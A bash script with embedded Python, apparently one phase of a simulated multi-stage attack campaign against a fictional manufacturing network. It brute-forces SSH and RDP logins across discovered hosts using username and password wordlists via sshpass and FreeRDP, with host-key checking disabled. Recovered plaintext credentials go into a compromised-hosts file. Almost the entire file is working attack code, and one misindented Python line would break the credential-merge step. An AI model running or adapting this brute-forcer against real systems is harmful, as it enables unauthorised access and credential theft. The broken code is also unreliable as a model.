#!/usr/bin/env bash

set -u

# ============================================================
# Nordic Manufacturing A/S
# H3 Incident Campaign V2.2
#
# PHASE 08 - MULTI-USER WORDLIST AUTHENTICATION
#
# Purpose:
#
#   Run password guessing ONLY against discovered SSH/RDP
#   targets that were NOT compromised during Phase 03.
#
# Behaviour:
#
#   - Existing compromised hosts are skipped.
#   - Multiple usernames are supported.
#   - Password wordlist is standard one-password-per-line format.
#   - Each username is tested against the password wordlist.
#   - Testing stops on first successful credential per host.
#   - Successful credentials are stored in compromised-hosts.json.
#   - Passwords are NOT written to normal campaign logs.
#   - wordlist-results.json does NOT contain passwords.
#   - Wordlist contents are NEVER written to logs/state.
#   - Successful username and attempt count may be recorded.
#   - Successful hosts are merged into compromised-hosts.json.
#
# ============================================================


# ============================================================
# PATHS
# ============================================================

BASE_DIR="/opt/nordic-attack"

CONFIG_FILE="$BASE_DIR/config/defaults.conf"
STATE_DIR="$BASE_DIR/state"
LOG_DIR="$BASE_DIR/logs"


# ============================================================
# LOAD CONFIGURATION
# ============================================================

if [[ ! -f "$CONFIG_FILE" ]]; then
    echo "[ERROR] Configuration file not found:"
    echo "        $CONFIG_FILE"
    exit 1
fi

# shellcheck source=/dev/null
source "$CONFIG_FILE"


INCIDENT_ID="${NORDIC_INCIDENT_ID:-H3-UNKNOWN}"

DISCOVERED_STATE="${NORDIC_DISCOVERED_STATE:-$STATE_DIR/discovered-hosts.json}"
COMPROMISED_STATE="${NORDIC_COMPROMISED_STATE:-$STATE_DIR/compromised-hosts.json}"
WORDLIST_STATE="$STATE_DIR/wordlist-results.json"

WORDLIST_ENABLED="${NORDIC_WORDLIST_ENABLED:-0}"
WORDLIST_FILE="${NORDIC_WORDLIST_FILE:-}"

SSH_USERNAME="${NORDIC_SSH_USERNAME:-${NORDIC_SSH_USER:-${NORDIC_DEFAULT_SSH_USER:-ubuntu}}}"
RDP_USERNAME="${NORDIC_RDP_USERNAME:-${NORDIC_RDP_USER:-${NORDIC_DEFAULT_RDP_USER:-Administrator}}}"

WORDLIST_USERS="${NORDIC_WORDLIST_USERS:-$SSH_USERNAME,$RDP_USERNAME}"

SSH_PORT="${NORDIC_SSH_PORT:-${NORDIC_DEFAULT_SSH_PORT:-22}}"
SSH_TIMEOUT="${NORDIC_SSH_TIMEOUT:-5}"

RDP_PORT="${NORDIC_RDP_PORT:-${NORDIC_DEFAULT_RDP_PORT:-3389}}"
RDP_TIMEOUT="${NORDIC_RDP_TIMEOUT:-5}"

CONNECT_TIMEOUT="${NORDIC_CONNECT_TIMEOUT:-2}"

LOG_FILE="$LOG_DIR/${INCIDENT_ID}-08-wordlist.log"

mkdir -p "$STATE_DIR" "$LOG_DIR"

touch "$LOG_FILE"


# ============================================================
# LOGGING
# ============================================================

log() {

    local MESSAGE="$1"

    echo "$MESSAGE"

    printf '%s %s\n' \
        "$(date --iso-8601=seconds)" \
        "$MESSAGE" \
        >> "$LOG_FILE"
}


ground_truth() {

    local MESSAGE="$1"

    if [[ -n "${NORDIC_GROUND_TRUTH_LOG:-}" ]]; then

        printf '%s INCIDENT=%s PHASE08 %s\n' \
            "$(date --iso-8601=seconds)" \
            "$INCIDENT_ID" \
            "$MESSAGE" \
            >> "$NORDIC_GROUND_TRUTH_LOG"

    fi
}


# ============================================================
# BANNER
# ============================================================

echo
echo "============================================================"
echo
echo " NORDIC MANUFACTURING"
echo " H3 INCIDENT CAMPAIGN V2.2"
echo " PHASE 08 - MULTI-USER WORDLIST AUTHENTICATION"
echo
echo "============================================================"
echo

log "[*] Incident ID: $INCIDENT_ID"


# ============================================================
# CHECK WORDLIST MODE
# ============================================================

if [[ "$WORDLIST_ENABLED" != "1" ]]; then

    log "[SKIPPED] Wordlist attack is disabled."

    exit 0
fi


if [[ -z "$WORDLIST_FILE" ]]; then

    log "[ERROR] Wordlist mode enabled but no wordlist file supplied."

    exit 1
fi


if [[ ! -f "$WORDLIST_FILE" ]]; then

    log "[ERROR] Wordlist file does not exist."

    exit 1
fi


if [[ ! -r "$WORDLIST_FILE" ]]; then

    log "[ERROR] Wordlist file is not readable."

    exit 1
fi


if [[ -z "$WORDLIST_USERS" ]]; then

    log "[ERROR] Wordlist mode enabled but no usernames supplied."

    exit 1
fi


# ============================================================
# REQUIRED COMMANDS
# ============================================================

for CMD in python3 timeout sshpass ssh; do

    if ! command -v "$CMD" >/dev/null 2>&1; then

        log "[ERROR] Required command not found: $CMD"

        exit 1
    fi

done


# ============================================================
# FREERDP
# ============================================================

FREERDP=""

if command -v xfreerdp3 >/dev/null 2>&1; then

    FREERDP="$(command -v xfreerdp3)"

elif command -v xfreerdp >/dev/null 2>&1; then

    FREERDP="$(command -v xfreerdp)"

fi


# ============================================================
# STATE VALIDATION
# ============================================================

if [[ ! -f "$DISCOVERED_STATE" ]]; then

    log "[ERROR] Discovery state not found:"
    log "        $DISCOVERED_STATE"

    exit 1
fi


if [[ ! -f "$COMPROMISED_STATE" ]]; then

    log "[ERROR] Compromised host state not found:"
    log "        $COMPROMISED_STATE"

    exit 1
fi


# ============================================================
# TCP CHECK
# ============================================================

tcp_open() {

    local HOST="$1"
    local PORT="$2"

    timeout "$CONNECT_TIMEOUT" \
        bash -c "echo >/dev/tcp/$HOST/$PORT" \
        >/dev/null 2>&1
}


# ============================================================
# TEMP FILES
# ============================================================

TARGET_FILE="$(mktemp)"
SUCCESS_FILE="$(mktemp)"
USER_FILE="$(mktemp)"


cleanup() {

    rm -f \
        "$TARGET_FILE" \
        "$SUCCESS_FILE" \
        "$USER_FILE"
}


trap cleanup EXIT


# ============================================================
# NORMALIZE USERNAME LIST
#
# Input example:
#
#   ubuntu,admin,student,Administrator
#
# Duplicate and empty usernames are removed.
# ============================================================

python3 - \
    "$WORDLIST_USERS" \
    "$USER_FILE" <<'PY'

import sys

raw_users = sys.argv[1]
output = sys.argv[2]

seen = set()
users = []

for raw in raw_users.split(","):

    username = raw.strip()

    if not username:
        continue

    if username in seen:
        continue

    seen.add(username)
    users.append(username)

with open(output, "w", encoding="utf-8") as f:

    for username in users:
        f.write(username + "\n")
PY


USER_COUNT=$(

    grep -cve '^[[:space:]]*$' \
        "$USER_FILE" \
        2>/dev/null || true
)


if (( USER_COUNT == 0 )); then

    log "[ERROR] No valid usernames remain after normalization."

    exit 1
fi


# ============================================================
# CREATE TARGET INVENTORY
#
# Existing compromised IP addresses are removed.
# ============================================================

python3 - \
    "$DISCOVERED_STATE" \
    "$COMPROMISED_STATE" \
    "$TARGET_FILE" <<'PY'

import ipaddress
import json
import sys


discovered_file = sys.argv[1]
compromised_file = sys.argv[2]
output_file = sys.argv[3]


def load_json(filename):

    with open(filename, encoding="utf-8") as f:
        return json.load(f)


def extract_hosts(data):

    if isinstance(data, list):
        return data

    if isinstance(data, dict):

        for key in (
            "hosts",
            "discovered_hosts",
            "compromised_hosts",
            "targets",
        ):

            value = data.get(key)

            if isinstance(value, list):
                return value

    return []


discovered = extract_hosts(
    load_json(discovered_file)
)

compromised = extract_hosts(
    load_json(compromised_file)
)


compromised_ips = set()

for host in compromised:

    if not isinstance(host, dict):
        continue

    ip = str(
        host.get("ip", "")
    ).strip()

    if ip:
        compromised_ips.add(ip)


targets = []

for host in discovered:

    if isinstance(host, str):

        ip = host.strip()

    elif isinstance(host, dict):

        ip = str(
            host.get("ip", "")
        ).strip()

    else:

        continue


    if not ip:
        continue


    try:

        address = ipaddress.ip_address(ip)

    except ValueError:

        continue


    if address.version != 4:
        continue


    if ip in compromised_ips:
        continue


    targets.append(ip)


targets = sorted(
    set(targets),
    key=lambda x: tuple(
        int(part)
        for part in x.split(".")
    ),
)


with open(
    output_file,
    "w",
    encoding="utf-8"
) as f:

    for ip in targets:

        f.write(ip + "\n")
PY


TARGET_COUNT=$(

    grep -cve '^[[:space:]]*$' \
        "$TARGET_FILE" \
        2>/dev/null || true
)


WORD_COUNT=$(

    grep -cve '^[[:space:]]*$' \
        "$WORDLIST_FILE" \
        2>/dev/null || true
)


echo

log "[*] Wordlist loaded."
log "[*] Candidate usernames: $USER_COUNT"
log "[*] Candidate passwords: $WORD_COUNT"
log "[*] Remaining discovered hosts: $TARGET_COUNT"
log "[*] SSH target port: $SSH_PORT"
log "[*] RDP target port: $RDP_PORT"

echo


# ============================================================
# NOTHING LEFT TO TEST
# ============================================================

if (( TARGET_COUNT == 0 )); then

    log "[+] No remaining discovered hosts require authentication testing."

    python3 - \
        "$WORDLIST_STATE" \
        "$INCIDENT_ID" \
        "$USER_COUNT" \
        "$WORD_COUNT" <<'PY'

import json
import sys

from datetime import datetime, timezone


output = sys.argv[1]
incident_id = sys.argv[2]
user_count = int(sys.argv[3])
word_count = int(sys.argv[4])


data = {

    "incident_id": incident_id,

    "phase": "08",

    "type": "multi-user-wordlist-authentication",

    "completed": datetime.now(
        timezone.utc
    ).isoformat(),

    "remaining_hosts_tested": 0,

    "candidate_usernames": user_count,

    "candidate_passwords": word_count,

    "authentication_attempts": 0,

    "new_compromises": 0,

    "hosts": [],
}


with open(output, "w", encoding="utf-8") as f:

    json.dump(data, f, indent=2)
PY

    exit 0
fi


# ============================================================
# COUNTERS
# ============================================================

TOTAL_ATTEMPTS=0

SSH_TARGETS=0
RDP_TARGETS=0

SSH_SUCCESSES=0
RDP_SUCCESSES=0

NEW_COMPROMISES=0


# ============================================================
# TEST TARGETS
# ============================================================

while IFS= read -r TARGET; do

    [[ -z "$TARGET" ]] && continue


    echo
    echo "------------------------------------------------------------"
    echo " Target: $TARGET"
    echo "------------------------------------------------------------"
    echo


    SSH_OPEN=0
    RDP_OPEN=0


    # --------------------------------------------------------
    # Service discovery
    # --------------------------------------------------------

    if tcp_open "$TARGET" "$SSH_PORT"; then

        SSH_OPEN=1

        SSH_TARGETS=$((SSH_TARGETS + 1))

        log "[TARGET][SSH] $TARGET:$SSH_PORT"

    fi


    if tcp_open "$TARGET" "$RDP_PORT"; then

        RDP_OPEN=1

        RDP_TARGETS=$((RDP_TARGETS + 1))

        log "[TARGET][RDP] $TARGET:$RDP_PORT"

    fi


    if (( SSH_OPEN == 0 && RDP_OPEN == 0 )); then

        log "[SKIPPED] No SSH/RDP authentication service detected on $TARGET"

        continue

    fi


    HOST_COMPROMISED=0


    # ========================================================
    # SSH MULTI-USER WORDLIST
    # ========================================================

    if (( SSH_OPEN == 1 )); then

        log "[*] Starting SSH multi-user wordlist authentication against $TARGET"

        SSH_ATTEMPTS=0


        while IFS= read -r USERNAME; do

            [[ -z "$USERNAME" ]] && continue


            if (( HOST_COMPROMISED == 1 )); then
                break
            fi


            log "[*][SSH] Testing username: $USERNAME"


            while IFS= read -r PASSWORD || [[ -n "$PASSWORD" ]]; do

                PASSWORD="${PASSWORD%$'\r'}"

                [[ -z "$PASSWORD" ]] && continue


                SSH_ATTEMPTS=$((SSH_ATTEMPTS + 1))

                TOTAL_ATTEMPTS=$((TOTAL_ATTEMPTS + 1))


                SSH_OUTPUT=$(

                    timeout "$SSH_TIMEOUT" \
                        sshpass -p "$PASSWORD" \
                        ssh \
                        -o StrictHostKeyChecking=no \
                        -o UserKnownHostsFile=/dev/null \
                        -o ConnectTimeout="$SSH_TIMEOUT" \
                        -o PreferredAuthentications=password \
                        -o PubkeyAuthentication=no \
                        -o NumberOfPasswordPrompts=1 \
                        -p "$SSH_PORT" \
                        "$USERNAME@$TARGET" \
                        'printf "NORDIC_ACCESS_OK\n"; uname -s 2>/dev/null || true; hostname 2>/dev/null || true' \
                        2>/dev/null

                )


                if printf '%s\n' "$SSH_OUTPUT" \
                    | grep -q '^NORDIC_ACCESS_OK$'; then


                    SSH_SUCCESSES=$((SSH_SUCCESSES + 1))

                    NEW_COMPROMISES=$((NEW_COMPROMISES + 1))

                    HOST_COMPROMISED=1


                    OS_NAME=$(

                        printf '%s\n' "$SSH_OUTPUT" \
                            | sed -n '2p'

                    )


                    HOSTNAME=$(

                        printf '%s\n' "$SSH_OUTPUT" \
                            | sed -n '3p'

                    )


                    PLATFORM="linux"


                    case "${OS_NAME,,}" in

                        *windows*|*microsoft*)

                            PLATFORM="windows"
                            ;;

                    esac


                    log "[SUCCESS][SSH] $TARGET username=$USERNAME authenticated on attempt $SSH_ATTEMPTS."


                    ground_truth \
                        "WORDLIST_SUCCESS ip=$TARGET service=ssh username=$USERNAME attempts=$SSH_ATTEMPTS"


                printf '%s|%s|ssh|%s|%s|%s|%s|%s|%s\n' \
                    "$TARGET" \
                    "$PLATFORM" \
                    "$SSH_PORT" \
                    "$USERNAME" \
                    "$HOSTNAME" \
                    "$OS_NAME" \
                    "$SSH_ATTEMPTS" \
                    "$PASSWORD" \
                    >> "$SUCCESS_FILE"


                    unset PASSWORD

                    break

                fi

            done < "$WORDLIST_FILE"


            if (( HOST_COMPROMISED == 1 )); then
                break
            fi

        done < "$USER_FILE"


        if (( HOST_COMPROMISED == 0 )); then

            log "[FAILED][SSH] $TARGET authentication failed after $SSH_ATTEMPTS attempts."

            ground_truth \
                "WORDLIST_FAILED ip=$TARGET service=ssh attempts=$SSH_ATTEMPTS"

        fi

    fi


    # ========================================================
    # RDP MULTI-USER WORDLIST
    #
    # If SSH already compromised the host, RDP is not tested.
    # ========================================================

    if (( RDP_OPEN == 1 && HOST_COMPROMISED == 0 )); then

        if [[ -z "$FREERDP" ]]; then

            log "[SKIPPED][RDP] FreeRDP client not installed."

        else

            log "[*] Starting RDP multi-user wordlist authentication against $TARGET"

            RDP_ATTEMPTS=0


            while IFS= read -r USERNAME; do

                [[ -z "$USERNAME" ]] && continue


                if (( HOST_COMPROMISED == 1 )); then
                    break
                fi


                log "[*][RDP] Testing username: $USERNAME"


                while IFS= read -r PASSWORD || [[ -n "$PASSWORD" ]]; do

                    PASSWORD="${PASSWORD%$'\r'}"

                    [[ -z "$PASSWORD" ]] && continue


                    RDP_ATTEMPTS=$((RDP_ATTEMPTS + 1))

                    TOTAL_ATTEMPTS=$((TOTAL_ATTEMPTS + 1))


                    if timeout "$RDP_TIMEOUT" \
                        "$FREERDP" \
                        /v:"$TARGET:$RDP_PORT" \
                        /u:"$USERNAME" \
                        /p:"$PASSWORD" \
                        /cert:ignore \
                        /auth-only \
                        >/dev/null 2>&1
                    then

                        RDP_SUCCESSES=$((RDP_SUCCESSES + 1))

                        NEW_COMPROMISES=$((NEW_COMPROMISES + 1))

                        HOST_COMPROMISED=1


                        log "[SUCCESS][RDP] $TARGET username=$USERNAME authenticated on attempt $RDP_ATTEMPTS."


                        ground_truth \
                            "WORDLIST_SUCCESS ip=$TARGET service=rdp username=$USERNAME attempts=$RDP_ATTEMPTS"


                        printf '%s|windows|rdp|%s|%s|||%s|%s\n' \
                            "$TARGET" \
                            "$RDP_PORT" \
                            "$USERNAME" \
                            "$RDP_ATTEMPTS" \
                            "$PASSWORD" \
                            >> "$SUCCESS_FILE"


                        unset PASSWORD

                        break

                    fi

                done < "$WORDLIST_FILE"


                if (( HOST_COMPROMISED == 1 )); then
                    break
                fi

            done < "$USER_FILE"


            if (( HOST_COMPROMISED == 0 )); then

                log "[FAILED][RDP] $TARGET authentication failed after $RDP_ATTEMPTS attempts."

                ground_truth \
                    "WORDLIST_FAILED ip=$TARGET service=rdp attempts=$RDP_ATTEMPTS"

            fi

        fi

    fi


done < "$TARGET_FILE"


# ============================================================
# MERGE NEW COMPROMISES
#
# SUCCESS FILE:
#
# IP|PLATFORM|ACCESS|PORT|USER|HOSTNAME|OS|ATTEMPTS|PASSWORD
#
# Password is used to update compromised-hosts.json.
# It is not included in wordlist-results.json.

if ! python3 - \
    "$COMPROMISED_STATE" \
    "$SUCCESS_FILE" \
    "$WORDLIST_STATE" \
    "$INCIDENT_ID" \
    "$TARGET_COUNT" \
    "$TOTAL_ATTEMPTS" \
    "$USER_COUNT" \
    "$WORD_COUNT" <<'PY'

import json
import sys

from datetime import datetime, timezone


(
    compromised_file,
    success_file,
    result_file,
    incident_id,
    target_count,
    total_attempts,
    user_count,
    word_count,
) = sys.argv[1:]


def load_json(filename):

    try:

        with open(filename, encoding="utf-8") as f:
            return json.load(f)

    except Exception:

        return []


def extract_hosts(data):

    if isinstance(data, list):
        return data

    if isinstance(data, dict):

        for key in (
            "hosts",
            "compromised_hosts",
        ):

            if isinstance(data.get(key), list):
                return data[key]

    return []


original = load_json(
    compromised_file
)

existing_hosts = extract_hosts(
    original
)


existing_by_ip = {}


for host in existing_hosts:

    if not isinstance(host, dict):
        continue

    ip = str(
        host.get("ip", "")
    ).strip()

    if ip:
        existing_by_ip[ip] = host


new_hosts = []


with open(
    success_file,
    encoding="utf-8"
) as f:

    for raw in f:

        raw = raw.rstrip("\n")

        if not raw:
            continue


       parts = raw.split("|")

        while len(parts) < 9:
            parts.append("")

        (
            ip,
            platform,
            access,
            port,
            username,
            hostname,
            os_name,
            attempts,
            password,
        ) = parts[:9]

        if ip in existing_by_ip:
            continue

        host = {
            "ip": ip,
            "platform": platform,
            "access": access,
            "primary_access": access,
            "authenticated": True,
            "compromised": True,
            "credential_method": "wordlist",
            "username": username,
            "password": password,
            "wordlist_attempts": int(attempts or 0),
            "hostname": hostname,
            "os": os_name,
            "access_methods": {
                access: {
                    "authenticated": True,
                    "port": int(port),
                    "username": username,
                    "password": password,
                    "method": "wordlist",
                    "attempts": int(attempts or 0),
                }
            },
        }

        if access == "ssh":
            host["ssh_port"] = int(port)
            host["ssh_user"] = username
            host["ssh_username"] = username
            host["ssh_password"] = password

        elif access == "rdp":
            host["rdp_port"] = int(port)
            host["rdp_user"] = username
            host["rdp_username"] = username
            host["rdp_password"] = password

        existing_hosts.append(host)
        existing_by_ip[ip] = host
        new_hosts.append(host)


# ------------------------------------------------------------
# Preserve compromised-state container format.
# ------------------------------------------------------------

if isinstance(original, list):

    merged_output = existing_hosts

elif isinstance(original, dict):

    merged_output = original

    if isinstance(
        original.get("hosts"),
        list
    ):
        merged_output["hosts"] = existing_hosts

    elif isinstance(
        original.get("compromised_hosts"),
        list
    ):
        merged_output["compromised_hosts"] = existing_hosts

    else:
        merged_output["hosts"] = existing_hosts

    merged_output["count"] = len(existing_hosts)

else:

    merged_output = existing_hosts


with open(
    compromised_file,
    "w",
    encoding="utf-8"
) as f:

    json.dump(
        merged_output,
        f,
        indent=2
    )


# ------------------------------------------------------------
# Phase 08 result state.
#
# Passwords and wordlist contents are deliberately absent.
# ------------------------------------------------------------

result = {

    "incident_id": incident_id,

    "phase": "08",

    "type": "multi-user-wordlist-authentication",

    "completed": datetime.now(
        timezone.utc
    ).isoformat(),

    "remaining_hosts_tested": int(
        target_count
    ),

    "candidate_usernames": int(
        user_count
    ),

    "candidate_passwords": int(
        word_count
    ),

    "authentication_attempts": int(
        total_attempts
    ),

    "new_compromises": len(
        new_hosts
    ),

    "hosts": [

        {

            "ip": host["ip"],

            "platform": host["platform"],

            "access": host["access"],

            "username": host[
                "access_methods"
            ][
                host["access"]
            ][
                "username"
            ],

            "credential_method": "wordlist",

            "attempts": host[
                "wordlist_attempts"
            ],

        }

        for host in new_hosts
    ],
}


with open(
    result_file,
    "w",
    encoding="utf-8"
) as f:

    json.dump(
        result,
        f,
        indent=2
    )
PY
then
    log "[ERROR] Failed to merge Phase 08 compromises into compromised-hosts.json."
    exit 1
fi


# ============================================================
# SUMMARY
# ============================================================

echo
echo "============================================================"
echo " PHASE 08 COMPLETED"
echo "============================================================"
echo

echo "Remaining discovered hosts:"
echo "  $TARGET_COUNT"
echo

echo "Candidate usernames:"
echo "  $USER_COUNT"
echo

echo "Candidate passwords:"
echo "  $WORD_COUNT"
echo

echo "SSH targets:"
echo "  $SSH_TARGETS"
echo

echo "RDP targets:"
echo "  $RDP_TARGETS"
echo

echo "Authentication attempts:"
echo "  $TOTAL_ATTEMPTS"
echo

echo "New compromises:"
echo "  $NEW_COMPROMISES"
echo

echo "SSH compromises:"
echo "  $SSH_SUCCESSES"
echo

echo "RDP compromises:"
echo "  $RDP_SUCCESSES"
echo

echo "Wordlist result state:"
echo "  $WORDLIST_STATE"
echo

echo "Updated compromised hosts:"
echo "  $COMPROMISED_STATE"
echo

echo "Log:"
echo "  $LOG_FILE"
echo


ground_truth \
    "PHASE_COMPLETE new_compromises=$NEW_COMPROMISES attempts=$TOTAL_ATTEMPTS"


exit 0